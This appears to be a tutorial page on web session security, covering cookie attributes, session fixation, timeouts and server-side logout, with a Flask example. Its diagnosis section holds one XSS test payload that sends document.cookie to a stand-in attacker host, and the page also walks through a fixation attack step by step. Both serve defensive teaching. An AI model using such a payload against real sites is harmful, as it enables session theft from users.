---
id: SEC-039
title: "Session Security (SameSite, Secure, HttpOnly)"
category: "Security"
tier: tier-2-networking-security
folder: SEC-security
difficulty: ★★☆
depends_on: SEC-013, SEC-016, SEC-019, SEC-020, SEC-034, SEC-038
used_by: SEC-067, SEC-073
related: SEC-013, SEC-016, SEC-019, SEC-020, SEC-034, SEC-038, SEC-067, SEC-073
tags:
  - security
  - session-management
  - cookies
  - samesite
  - httponly
  - secure
  - session-fixation
  - session-hijacking
status: complete
version: 4
layout: default
parent: "Security"
grand_parent: "Technical Mastery"
nav_order: 39
permalink: /technical-mastery/sec/session-security-samesite-secure-httponly/
---

⚡ TL;DR - Session security is about protecting the session ID
(the credential that proves a user is authenticated). Three
cookie attributes are required for every session cookie:

**The Three Required Cookie Attributes:**
- `HttpOnly`: JavaScript cannot read the cookie. Prevents XSS
  from stealing the session ID.
- `Secure`: Cookie only sent over HTTPS. Prevents network interception.
- `SameSite=Lax`: Cookie not sent with cross-origin POST requests.
  Prevents CSRF attacks.

**Beyond cookie attributes:**
- Regenerate session ID after login (prevents session fixation)
- Set absolute timeout (e.g., 8 hours) and idle timeout (e.g., 30 min)
- Invalidate session server-side on logout (not just delete cookie)
- Use 128+ bits of cryptographic randomness for session IDs
- Store sessions server-side (Redis in distributed apps)

---

| #039 | Category: Security | Difficulty: ★★☆ |
|:---|:---|:---|
| **Depends on:** | Cookie/Session Management, Authentication, Security Headers, CSRF Prevention, HTTPS | |
| **Used by:** | Business Logic Vulnerabilities, Secrets Management | |
| **Related:** | Cookie Security, CSRF Prevention, Authentication, JWT vs Sessions | |

---

### 🔥 The Problem This Solves

**SESSIONS ARE THE AUTHENTICATION ARTIFACT:**
HTTP is stateless. Sessions are the mechanism that makes
browsers "stay logged in." After a user authenticates, the
server creates a session and sends a session ID cookie.
On every subsequent request: the browser sends the session ID
cookie, and the server looks up the session to identify the user.
If an attacker obtains the session ID: they are authenticated
as that user without knowing the password. Session security
is about making the session ID unguessable, uncopyable,
and with a limited lifespan.

**THREE DISTINCT THREATS TO SESSIONS:**
1. **XSS steals session cookie:** JavaScript `document.cookie`
   reads all non-HttpOnly cookies. An XSS payload can exfiltrate
   session IDs to the attacker. `HttpOnly` blocks this.

2. **Network interception:** HTTP sessions in plaintext expose
   session cookies to network observers. `Secure` attribute
   ensures cookies only travel over TLS.

3. **CSRF forges requests using session cookie:** Browser
   auto-sends cookies with cross-origin requests. `SameSite=Lax`
   prevents this for most attack patterns.

4. **Session fixation:** Attacker sets a known session ID in
   victim's browser before login. Victim logs in with that ID.
   Attacker now shares the victim's authenticated session.
   Fix: regenerate session ID on authentication.

---

### 📘 Textbook Definition

**Session:** Server-side state keyed by a session ID (a
cryptographically random identifier sent to the client as
a cookie). Contains: user ID, authentication state, expiry time,
any per-session data.

**Session ID:** A cryptographically random value (minimum 128 bits
from a CSPRNG) that identifies a server-side session record.
Properties: unguessable (brute-force infeasible), unique per session,
unpredictable (no patterns that allow prediction from known IDs).

**Cookie Attributes:**

- `HttpOnly`: Cookie inaccessible to JavaScript (document.cookie).
  Still sent automatically by browser in HTTP requests.
  Protection: prevents XSS from reading session IDs.
  Does NOT prevent: CSRF (browser still sends automatically),
  network interception (use Secure for that).

- `Secure`: Cookie only sent over HTTPS connections. Browser
  refuses to send over HTTP. Protection: network interception
  of session cookies is prevented.
  Does NOT prevent: XSS (use HttpOnly for that).

- `SameSite=Lax`: Browser does not send cookie for cross-origin
  sub-requests (fetch, XHR, form POST, image, iframe).
  Cookie IS sent for top-level navigation (user clicking a link).
  Protection: primary CSRF defense.

- `SameSite=Strict`: Cookie never sent cross-origin, including
  top-level navigation from external links.
  Protection: strongest CSRF defense.
  Trade-off: worse UX (user clicking link from email appears logged out).

- `Path`: Cookie only sent for URLs under specified path.
  Security value: limited (not a strong isolation mechanism).

- `Domain`: Cookie scope. If `Domain=example.com` set:
  cookie shared with all subdomains. If not set: cookie
  scoped to exact host that set it.
  Security note: setting `Domain=` can EXPAND cookie scope.

- `Max-Age` / `Expires`: Persistent cookie (survives browser
  restart). Without these: session cookie (deleted on browser close).

**Session Fixation:** An attack where the attacker obtains
a valid pre-authentication session ID (e.g., from the
unauthenticated login page) and sets it in the victim's browser.
When the victim logs in, the server authenticates the existing
session. The attacker's known session ID is now authenticated.
Prevention: always issue a NEW session ID on authentication
(regardless of whether a session exists for the request).

**Session Timeout Types:**
- **Absolute timeout:** Session expires after a fixed time
  from creation (e.g., 8 hours), regardless of activity.
  Prevents sessions from persisting indefinitely.
- **Idle timeout:** Session expires after a period of inactivity
  (e.g., 30 minutes). Last-activity timestamp updated on requests.
  Longer than absolute timeout of last activity window.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
Session cookies need: `HttpOnly` (blocks XSS theft),
`Secure` (blocks network theft), `SameSite=Lax` (blocks CSRF).
Regenerate session ID on login. Invalidate server-side on logout.

**One analogy:**
> A session ID is like a hotel key card. `HttpOnly` = the card
> is in a sleeve that can't be read by card-skimming devices
> (JavaScript) - only the door reader (HTTP server) can scan it.
> `Secure` = the card is only usable in the hotel building
> (HTTPS) - not in the parking lot (HTTP). `SameSite=Lax` =
> the card is only presented when you walk to the door yourself
> (first-party request), not when a stranger carries it on your
> behalf (cross-origin request). Regenerating on login = you
> get a new card when you check in (not using any pre-existing
> card). Server-side invalidation on logout = the hotel deactivates
> the card in their system - even if someone has a physical
> copy of the card, it no longer works.

---

### 🔩 First Principles Explanation

**Session ID requirements and why each matters:**

```
SESSION ID PROPERTIES:

PROPERTY 1: Cryptographic randomness (CSPRNG)
  Required: Minimum 128 bits from a CSPRNG
  (Cryptographically Secure Pseudo-Random Number Generator)
  
  BAD: Sequential IDs (1, 2, 3...)
    Attack: guess adjacent session IDs
    1 minute of brute-force: attacker enumerates all active sessions
  
  BAD: Time-based IDs (microseconds since epoch)
    Attack: timestamp-based IDs are predictable
    Attacker knows approximate timestamp: small search space
  
  GOOD: secrets.token_urlsafe(32) (Python) = 256 bits random
    2^256 possible values → brute force infeasible
    
  Framework defaults: Flask/Django/Rails use CSPRNG by default.
    Don't implement session ID generation yourself.

PROPERTY 2: Bound to session record (not self-contained)
  BAD: JWT as session token
    All session data in the token. Cannot invalidate.
    If JWT is stolen: valid until expiry. No server-side revocation.
    (JWTs are valid for stateless auth; for sessions, use opaque IDs)
  
  GOOD: Opaque session ID → lookup in Redis/DB
    Session data server-side. Can invalidate immediately.
    Logout: delete session from Redis. Stolen ID → invalid.

PROPERTY 3: Absolute and idle expiry
  Without expiry: stolen session valid forever.
  
  ABSOLUTE TIMEOUT (e.g., 8 hours after creation):
    Limits window for stolen session use.
    Implementation: session['created_at'] + MAX_AGE > now
    
  IDLE TIMEOUT (e.g., 30 min inactivity):
    Limits window on shared computers (user forgets to logout)
    Implementation: session['last_activity'] + IDLE_TIMEOUT > now
    Update last_activity on every request.

SESSION FIXATION ATTACK + FIX:

  WITHOUT FIX:
    1. Attacker: GET /login
       Server creates session_id=ATTACKER_KNOWN_ID (pre-auth session)
       Server sends Set-Cookie: session=ATTACKER_KNOWN_ID
    
    2. Attacker: injects session cookie into victim's browser
       (via XSS, link with session in URL, sub-domain cookie injection)
    
    3. Victim: logs in with victim credentials
       Server: authenticates, stores user_id in session ATTACKER_KNOWN_ID
       
    4. Attacker: uses session_id=ATTACKER_KNOWN_ID
       Server: session has user_id → authenticated as victim
  
  WITH FIX: Regenerate session ID on login
    3. Victim: logs in
       Server: authenticate, then:
         session.clear()      ← clear pre-auth session
         new_id = create_session()  ← new cryptographic ID
         session['user_id'] = user.id
         set_cookie(response, 'session', new_id)
    
    4. Attacker: uses ATTACKER_KNOWN_ID
       Server: session not found (deleted on login) → not authenticated
```

---

### 🧪 Thought Experiment

**SCENARIO: Why logout must invalidate server-side**

```
SCENARIO: User uses a shared computer at a library

WITHOUT SERVER-SIDE INVALIDATION:
  1. User logs into bank.com on library computer.
     Browser receives: Set-Cookie: session=ABCD1234; HttpOnly; Secure; SameSite=Lax
  2. User clicks "Logout".
     Application: deletes session cookie from browser.
     Browser: session cookie removed from library computer.
  3. User leaves.
  
  4. ATTACK: Next user opens browser history, finds bank.com.
     OR: Browser history shows previous session cookie was ABCD1234.
     OR: Attacker ran packet capture, has ABCD1234 from HTTP.
  5. Attacker: manually sets cookie session=ABCD1234 in browser.
     Request: GET /dashboard with Cookie: session=ABCD1234
     Server: looks up ABCD1234 in session store.
     ABCD1234 still exists in Redis!
     Server: authenticated as victim. Attack successful.

WITH SERVER-SIDE INVALIDATION:
  2. User clicks "Logout".
     Application: 
       redis.delete(f"session:{session_id}")  ← server-side delete
       clear session cookie from browser.
  
  5. Attacker: sets cookie session=ABCD1234.
     Request: GET /dashboard with Cookie: session=ABCD1234
     Server: looks up ABCD1234 in Redis.
     NOT FOUND (deleted at logout).
     Server: 401 Unauthorized. Redirect to login.
  
  Attacker's cookie is useless: the server no longer recognizes it.

ALSO IMPORTANT: Absolute session timeout
  Even without explicit logout: session expires after 8 hours.
  Library visits next morning: session already expired.
  Defense in depth: even if logout is buggy, sessions don't persist.

JWT REVOCATION PROBLEM (why sessions are sometimes better than JWT):
  JWT: session data in the token, signed.
  Logout: delete JWT from client.
  ATTACK: attacker has copy of JWT. JWT is still valid until exp.
  Server has no way to invalidate a JWT (stateless by design).
  
  Solution for JWT: maintain a "revoked tokens" list (denylist).
  But now you have server-side state (similar to sessions).
  For low-security apps: accept the revocation gap (JWT expiry).
  For high-security: use sessions OR JWT with server-side denylist.
```

---

### 🧠 Mental Model / Analogy

> Session security is like issuing and managing backstage passes
> at a concert venue. The pass = session cookie. Properties:
> 
> `HttpOnly` = passes are in sealed envelopes; security staff
> see the barcode (server reads cookie) but visitors can't
> read or copy the barcode (JavaScript can't access it).
> 
> `Secure` = passes only work inside the secured area (HTTPS);
> not in the public lobby (HTTP).
> 
> `SameSite=Lax` = the venue only accepts passes presented
> by the pass holder themselves (first-party request), not
> passes handed over by someone else (cross-origin request).
> 
> Session regeneration on login = the pre-concert queue gives
> you a temporary ticket. When you reach the gate and are
> verified, you get a NEW backstage pass. The temporary
> ticket is invalidated. Someone who grabbed your temporary
> ticket can't use it.
> 
> Server-side invalidation on logout = security cancels your
> pass in their system. Having a physical copy is useless.

---

### 📶 Gradual Depth - Five Levels

**Level 1 - What it is (anyone can understand):**
When you log in to a website, the server gives you a "session
cookie" - a random ID that keeps you logged in. Session security
is about protecting that ID from being stolen. Three cookie
settings do most of the work: `HttpOnly` (prevents JavaScript
from reading it), `Secure` (only sent over HTTPS), and `SameSite`
(prevents cross-site request tricks). When you log out, the
server should delete the session from its memory - not just
delete your cookie.

**Level 2 - How to use it (junior developer):**
In Flask: `app.config['SESSION_COOKIE_HTTPONLY'] = True`,
`SESSION_COOKIE_SECURE = True`, `SESSION_COOKIE_SAMESITE = 'Lax'`.
In Django: already secure by default (check `SESSION_COOKIE_*`
settings). In Node.js/express-session: `{cookie: {httpOnly: true, secure: true, sameSite: 'lax'}}`. For logout: `session.destroy()` (express-session) or `session.flush()` (Flask).
Set absolute session timeout. Use Redis for distributed sessions.

**Level 3 - How it works (mid-level engineer):**
Session IDs must come from a CSPRNG (Python: `secrets.token_urlsafe`,
Java: `SecureRandom`, Node: `crypto.randomBytes`). Store sessions
in Redis with TTL for distributed applications. Regenerate session
ID on elevation of privilege (login, password change). Concurrent
session control: allow only N active sessions per user (extra
sessions force logout). Monitor for session anomalies: same session
from different geolocations in short time. Session fixation:
regenerate on authentication. All cookie attributes set at cookie
creation time (cannot change without re-creating the cookie).

**Level 4 - Why it was designed this way (senior/staff):**
HTTP's statelessness was an architectural choice for simplicity
and scalability. Sessions are a stateful overlay on stateless
HTTP. The tension: sessions require server-side state (Redis
or DB), which creates storage and scalability concerns. JWT
was promoted as a stateless alternative - but JWT cannot be
revoked without server-side state (denylist), negating the
stateless benefit for logout security. The choice between
sessions (opaque IDs + server state) vs JWT (self-contained
tokens + stateless verification) is a trade-off between
revocability and scalability. Sessions win for: high-security
apps requiring immediate logout, user management (deactivate
account takes effect immediately). JWT wins for: microservices
auth across service boundaries without shared session store.

**Level 5 - Mastery (distinguished engineer):**
Browser storage evolution: `document.cookie` (original),
`localStorage` (XSS risk: no HttpOnly, same-origin only),
`sessionStorage` (tab-scoped, same XSS risk). Service Worker
intercepting fetch can access Authorization headers but not
cookies. The most XSS-resistant session storage: HttpOnly
cookies (inaccessible to JavaScript entirely). The second-most
secure: in-memory JavaScript variable (stolen on page reload
but NOT accessible to injected scripts on OTHER origins due
to origin isolation). Anti-patterns: session ID in URL
(`?session=ABCD`) - logged in server logs, Referer headers,
browser history. Session binding to device fingerprint
(IP, User-Agent) adds detection capability but can false-positive
on legitimate users (IP changes on mobile, User-Agent changes
on update). Anomaly-based session validation (ML-based) detects
impossible logins (geographic velocity attacks) without
disrupting legitimate users.

---

### ⚙️ How It Works (Mechanism)

**Session lifecycle with Redis:**

```
SESSION LIFECYCLE:

AUTHENTICATION (login):
  1. POST /login { username, password }
  2. Server: validate credentials
  3. Server: create session
     session_id = secrets.token_urlsafe(32)  # 256 bits random
     session_data = {
         'user_id': user.id,
         'created_at': datetime.utcnow().isoformat(),
         'last_activity': datetime.utcnow().isoformat(),
     }
     redis.setex(
         f"session:{session_id}",
         60 * 60 * 8,  # 8 hour TTL
         json.dumps(session_data)
     )
  4. Server sends: Set-Cookie: session=<session_id>;
       HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=28800

REQUEST PROCESSING:
  1. GET /dashboard Cookie: session=<session_id>
  2. Server: get session
     session_data = redis.get(f"session:{session_id}")
     if not session_data: return 401 Unauthorized
     session = json.loads(session_data)
  3. Check expiry:
     created = datetime.fromisoformat(session['created_at'])
     if (datetime.utcnow() - created).seconds > MAX_AGE: return 401
     
     last_activity = datetime.fromisoformat(session['last_activity'])
     if (datetime.utcnow() - last_activity).seconds > IDLE_TIMEOUT: return 401
  4. Update last_activity:
     session['last_activity'] = datetime.utcnow().isoformat()
     redis.setex(f"session:{session_id}", REMAINING_TTL, json.dumps(session))
  5. Authorize based on session['user_id']
  6. Process request

LOGOUT:
  1. POST /logout Cookie: session=<session_id>
  2. Server:
     redis.delete(f"session:{session_id}")  ← SERVER-SIDE delete
  3. Server sends: Set-Cookie: session=; Max-Age=0; HttpOnly; Secure
     (Clear cookie from browser too - defense in depth)
  4. Redirect to login page

PRIVILEGE ESCALATION (e.g., login, sudo):
  1. Successful authentication of higher-privilege operation
  2. Server:
     old_data = copy of old session (preserve important data)
     redis.delete(f"session:{old_session_id}")  ← delete old
     new_session_id = secrets.token_urlsafe(32)  ← create new
     redis.setex(f"session:{new_session_id}", TTL, json.dumps(session_data))
  3. Server sends new session ID cookie
  Result: attacker who held old session ID is invalidated
```

---

### 💻 Code Example

**Secure session configuration in Python Flask:**

```python
# Flask session security configuration
from flask import Flask, session, redirect, url_for, request
from flask_session import Session
import redis
import secrets
import json
from datetime import datetime, timedelta
from functools import wraps

app = Flask(__name__)

# Session security configuration
app.config.update(
    # Use server-side session (not client-side signed cookie)
    SESSION_TYPE='redis',
    SESSION_REDIS=redis.Redis(host='localhost', port=6379, db=0),
    SESSION_KEY_PREFIX='session:',
    
    # Cookie security attributes
    SESSION_COOKIE_HTTPONLY=True,     # JS cannot read cookie
    SESSION_COOKIE_SECURE=True,       # HTTPS only
    SESSION_COOKIE_SAMESITE='Lax',    # CSRF protection
    SESSION_COOKIE_NAME='sid',        # Not "session" (not informative)
    
    # Session lifetime
    PERMANENT_SESSION_LIFETIME=timedelta(hours=8),  # Absolute timeout
    
    # Secret key for signing (not session data itself - still Redis)
    SECRET_KEY=secrets.token_hex(32),  # Or load from secrets manager
)

Session(app)

IDLE_TIMEOUT = timedelta(minutes=30)
MAX_SESSION_AGE = timedelta(hours=8)

def login_required(f):
    """Decorator to require authentication."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        
        # Check absolute timeout
        created_at = session.get('created_at')
        if created_at:
            age = datetime.utcnow() - datetime.fromisoformat(created_at)
            if age > MAX_SESSION_AGE:
                session.clear()
                return redirect(url_for('login'))
        
        # Check idle timeout
        last_activity = session.get('last_activity')
        if last_activity:
            idle = datetime.utcnow() - datetime.fromisoformat(
                last_activity
            )
            if idle > IDLE_TIMEOUT:
                session.clear()
                return redirect(url_for('login'))
        
        # Update last activity
        session['last_activity'] = datetime.utcnow().isoformat()
        session.modified = True
        
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    user = authenticate_user(username, password)
    if not user:
        return 'Invalid credentials', 401
    
    # SESSION FIXATION PREVENTION:
    # Clear any existing session before creating authenticated one
    session.clear()
    # Flask-Session creates new session ID on clear()
    
    # Set session data
    session['user_id'] = user.id
    session['created_at'] = datetime.utcnow().isoformat()
    session['last_activity'] = datetime.utcnow().isoformat()
    session.permanent = True
    
    return redirect(url_for('dashboard'))

@app.route('/logout', methods=['POST'])
@login_required
def logout():
    # SERVER-SIDE session invalidation (not just cookie deletion)
    session.clear()  # Flask-Session: deletes from Redis
    return redirect(url_for('login'))

@app.route('/dashboard')
@login_required
def dashboard():
    return f"Welcome, user {session['user_id']}"
```

---

### ⚖️ Comparison Table

| Attribute | Protects Against | Does NOT Protect Against |
|:---|:---|:---|
| **HttpOnly** | XSS cookie theft | CSRF, network interception |
| **Secure** | Network interception | XSS, CSRF |
| **SameSite=Lax** | CSRF (most scenarios) | XSS, network interception, GET-based CSRF |
| **SameSite=Strict** | CSRF (all scenarios) | XSS, network interception; degrades UX |
| **Short TTL** | Long-lived stolen sessions | Active session theft |
| **Server-side invalidation** | Post-logout theft | Active session theft |
| **Regenerate on login** | Session fixation | XSS, CSRF, interception |

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|:---|:---|
| Deleting the session cookie on logout is sufficient logout | Deleting the cookie prevents the BROWSER from sending the session ID on future requests. But if an attacker has already copied the session ID (via XSS, network interception, or log access), they still have a valid session ID. The server will accept requests with the old session ID until it expires naturally. Server-side invalidation (deleting the session from Redis/DB) is required. Only when the server no longer recognizes the session ID can logout be considered complete. Both steps are needed: delete cookie (prevent browser reuse) AND delete server-side session (prevent attacker reuse). |
| HttpOnly prevents XSS attacks | HttpOnly prevents XSS from STEALING the session cookie via `document.cookie`. It does NOT prevent other XSS damage: modifying the DOM, making requests on behalf of the user, exfiltrating visible page data, installing keyloggers, redirecting navigation. HttpOnly is one mitigation for one specific XSS attack (session theft). XSS prevention (output encoding, CSP) is still required. Think of HttpOnly as "even if XSS happens, the session cookie specifically cannot be stolen" - not "HttpOnly makes the application immune to XSS." |

---

### 🚨 Failure Modes & Diagnosis

**Session security vulnerabilities and how to find them:**

```
VULNERABILITY 1: Missing HttpOnly flag
  Detection:
    Browser DevTools → Application → Cookies
    Look for: session cookie WITHOUT HttpOnly flag
    
    curl -I https://example.com/login \
      -c cookies.txt | grep Set-Cookie
    Should see: HttpOnly in Set-Cookie header

  Test (XSS theft possible without HttpOnly):
    Inject: <img src=x onerror="fetch('https://attacker.com/c?'+document.cookie)">
    Without HttpOnly: session cookie exfiltrated
    With HttpOnly: document.cookie empty (cookie not visible to JS)

VULNERABILITY 2: Session not regenerated on login
  Detection:
    1. GET /login - capture Set-Cookie session ID value (pre-auth)
    2. POST /login (authenticate successfully)
    3. Check: does the session ID change?
    If SAME session ID before and after login: session fixation possible.

VULNERABILITY 3: Session persists after logout
  Detection:
    1. Log in, note session ID (e.g., from DevTools)
    2. Log out
    3. Manually add the old session cookie back (DevTools or curl)
    4. Request an authenticated page
    If 200 OK (not redirect to login): session not invalidated server-side.
    
    curl --cookie "session=OLD_SESSION_ID" https://example.com/dashboard
    Should return: 302 to /login (session invalid)

VULNERABILITY 4: Session ID in URL
  Detection: grep application logs for session IDs in request URLs
    /dashboard?session=ABCD1234 → session in URL
    This appears in: server access logs, browser history,
      Referer headers when navigating to external links
  
  Fix: session IDs only in cookies (never in URL parameters)
```

---

### 🔗 Related Keywords

**Prerequisites:**
- `Cookie and Session Management` - foundational concepts
- `Authentication Fundamentals` - what sessions represent
- `CSRF Prevention` - SameSite cookie attribute

**Builds on this:**
- `Business Logic Vulnerabilities` - session-based access control
- `Secrets Management` - session secret key management

---

### 📌 Quick Reference Card

```
┌──────────────────────────────────────────────────────────┐
│ SESSION ID   │ 128+ bits CSPRNG (never sequential/time)  │
│              │ Server-side store (Redis/DB), not JWT      │
├──────────────┼───────────────────────────────────────────┤
│ COOKIE ATTRS │ HttpOnly (no JS access)                   │
│              │ Secure (HTTPS only)                        │
│              │ SameSite=Lax (no CSRF)                     │
├──────────────┼───────────────────────────────────────────┤
│ ON LOGIN     │ Regenerate session ID (fixation prevention)│
│              │ Set created_at timestamp (absolute timeout)│
├──────────────┼───────────────────────────────────────────┤
│ ON LOGOUT    │ Delete server-side session (Redis/DB)      │
│              │ Clear cookie (defense in depth)            │
├──────────────┼───────────────────────────────────────────┤
│ TIMEOUTS     │ Absolute: 8 hours (bank: 1 hour)          │
│              │ Idle: 30 minutes                           │
└──────────────────────────────────────────────────────────┘
```

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
"Revocability requires server-side state."
This principle appears in multiple security domains:
- Session cookies: can be revoked (server deletes session)
  vs JWT: cannot be revoked without server-side denylist
- OAuth tokens: access token (short-lived, not revocable efficiently)
  vs refresh token (long-lived, revocable via server-side store)
- API keys: can be revoked (delete from DB)
  vs signed JWTs: valid until expiry regardless of server action
- Certificates: can be revoked via CRL/OCSP
  vs hard-coded keys: no standard revocation mechanism

Whenever you need the ability to immediately terminate access:
you need server-side state. The convenience of stateless tokens
(JWTs, signed cookies) trades away immediate revocability.
Choose based on whether your security model requires
"revoke immediately on logout/compromise" (sessions/server-state)
or "tolerate N-minute window until expiry" (JWTs).

---

### 💡 The Surprising Truth

The `SameSite=Lax` attribute became the browser default for
cookies without an explicit SameSite value starting with
Chrome 80 (2020), Firefox 79 (2020), and Safari 12 (2018).
This means: ANY application that uses session cookies and runs
on a modern browser has CSRF protection by default - even if
the developer never heard of SameSite. The browser changed
the default from "no SameSite restriction" (equivalent to
`None`) to `Lax`. This single browser behavior change made
CSRF attacks significantly harder without any developer
action required. However: applications with explicit
`SameSite=None` (legacy payment integrations, SSO) lost
this protection and must use CSRF tokens explicitly.
It's unusual for a browser change to retroactively secure
millions of existing applications. Most security improvements
require developer action. SameSite defaulting to Lax is
a case where the platform fixed the vulnerability class
universally, demonstrating the power of secure defaults at
the infrastructure level.

---

### ✅ Mastery Checklist

**You've mastered this when you can:**
1. **CONFIGURE** session cookies with all three required attributes
   (HttpOnly, Secure, SameSite=Lax) in your framework of choice.
2. **IMPLEMENT** server-side session invalidation on logout using
   Redis as the session store.
3. **PREVENT** session fixation by regenerating the session ID
   on successful authentication.
4. **TEST** session security: verify HttpOnly prevents JS access,
   confirm logout invalidates server-side, check session ID
   changes on login.

---

### 🎯 Interview Deep-Dive

**Q: How do you implement secure session management?
What are the risks of not having HttpOnly on session cookies?**

*Why they ask:* Tests practical session security knowledge and
whether the candidate understands the layered protection
model (each attribute protects against a different attack).

*Strong answer includes:*
- Session IDs: cryptographically random (128+ bits from CSPRNG).
  Server-side store (Redis with TTL). Never in URL parameters.
- Cookie attributes: HttpOnly (blocks XSS theft), Secure (HTTPS only),
  SameSite=Lax (prevents CSRF for cross-site POST/fetch).
- HttpOnly risk: without it, any XSS payload can execute
  `document.cookie` to read the session ID and exfiltrate it.
  The attacker can then use the session from their own browser
  (session hijacking). With HttpOnly: XSS can still do damage
  (DOM manipulation, API calls on user's behalf) but cannot
  steal the session token itself.
- Session fixation prevention: regenerate session ID on login.
  Old session ID (which attacker may have set) is invalidated.
  New session ID is unknown to the attacker.
- Logout: invalidate server-side (delete from Redis).
  Clearing only the cookie leaves the session valid for anyone
  who already copied the ID. Server-side deletion makes
  the token permanently useless.
- Timeouts: absolute (e.g., 8 hours) and idle (30 minutes)
  to limit the window of a stolen session's usability.